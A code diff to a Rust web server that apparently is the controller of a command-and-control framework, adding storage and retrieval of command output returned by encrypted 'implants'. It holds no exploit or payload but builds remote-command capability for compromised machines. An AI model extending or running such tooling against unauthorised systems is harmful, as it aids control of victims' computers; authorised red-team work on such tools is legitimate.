@@ -10,6 +10,7 @@ use x25519_dalek::{PublicKey, StaticSecret};
 use crate::db::connect::Pool;
 use crate::errors::ServerError;
 use crate::models::implant::{Implant, SystemInfo};
+use crate::models::plain_result::PlainResult;
 use crate::models::task::{Task, Tasks};
 use crate::utils::network_encryption;
 
@@ -70,10 +71,10 @@ pub async fn post_task(
     // Get task from db
     let db_clone = db.clone();
     let task_id_clone = task_id.clone();
-    let task_type = web::block(move || get_task_from_db(db_clone, task_id_clone)).await??;
+    let task = web::block(move || get_task_from_db(db_clone, task_id_clone)).await??;
 
     // Using unwrap is safe here because task is fetched from db
-    let task_enum = Tasks::from_str(task_type.as_str()).unwrap();
+    let task_enum = Tasks::from_str(task.task.as_str()).unwrap();
 
     // Check task type and according to that run correct arm
     match task_enum {
@@ -83,10 +84,53 @@ pub async fn post_task(
             // Find and update implant in implants table
             web::block(move || update_implant(db, deserialized_response)).await??;
         }
+        Tasks::Command => {
+            let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;
+
+            // Save in plain_results table
+            web::block(move || add_plain_result(db, task.task_id, deserialized_response)).await??;
+            // let stdout = String::from_utf8(deserialized_response)?;
+        }
         _ => unimplemented!(),
     }
 
     Ok(HttpResponse::Ok().finish())
+}
+
+#[get("/plain_result/{task_id}")]
+pub async fn get_plain_result(
+    db: web::Data<Pool>,
+    path: web::Path<String>,
+) -> Result<impl Responder, ServerError> {
+    let task_id = path.into_inner();
+
+    // Get only plain_result from db that belongs to received task_id
+    let plain_result = web::block(move || get_plain_result_from_db(db, task_id)).await??;
+
+    if plain_result.is_empty() {
+        Ok(HttpResponse::Ok().body("wait"))
+    } else {
+        Ok(HttpResponse::Ok().json(plain_result[0].clone()))
+    }
+}
+
+fn get_plain_result_from_db(
+    db: web::Data<Pool>,
+    task_id: String,
+) -> Result<Vec<PlainResult>, ServerError> {
+    use crate::schema::tasks::dsl::tasks;
+
+    let conn = db.get()?;
+
+    let task_id = uuid::Uuid::parse_str(&task_id)?;
+
+    let task = tasks.find(task_id).get_result::<Task>(&conn)?;
+
+    let plain_result_vec = PlainResult::belonging_to(&task)
+        .limit(1)
+        .load::<PlainResult>(&conn)?;
+
+    Ok(plain_result_vec)
 }
 
 fn update_task(
@@ -131,7 +175,7 @@ fn get_implant_data_from_db(
     Ok((target.server_private_key, target.public_key))
 }
 
-fn get_task_from_db(db: web::Data<Pool>, task_id: String) -> Result<String, ServerError> {
+fn get_task_from_db(db: web::Data<Pool>, task_id: String) -> Result<Task, ServerError> {
     use crate::schema::tasks::dsl::tasks;
 
     let conn = db.get()?;
@@ -140,7 +184,7 @@ fn get_task_from_db(db: web::Data<Pool>, task_id: String) -> Result<String, Serv
 
     let target: Task = tasks.find(task_id).first(&conn)?;
 
-    Ok(target.task)
+    Ok(target)
 }
 
 fn decrypt_response(
@@ -207,6 +251,24 @@ fn update_implant(db: web::Data<Pool>, system_info: SystemInfo) -> Result<(), Se
             pid.eq(system_info.pid),
             architecture.eq(system_info.architecture),
         ))
+        .execute(&conn)?;
+
+    Ok(())
+}
+
+fn add_plain_result(
+    db: web::Data<Pool>,
+    task_id: uuid::Uuid,
+    deserialized_response: Vec<u8>,
+) -> Result<(), ServerError> {
+    use crate::schema::plain_results::dsl::plain_results;
+
+    let conn = db.get()?;
+
+    let plain_result = PlainResult::new(deserialized_response, task_id);
+
+    diesel::dsl::insert_into(plain_results)
+        .values(&plain_result)
         .execute(&conn)?;
 
     Ok(())
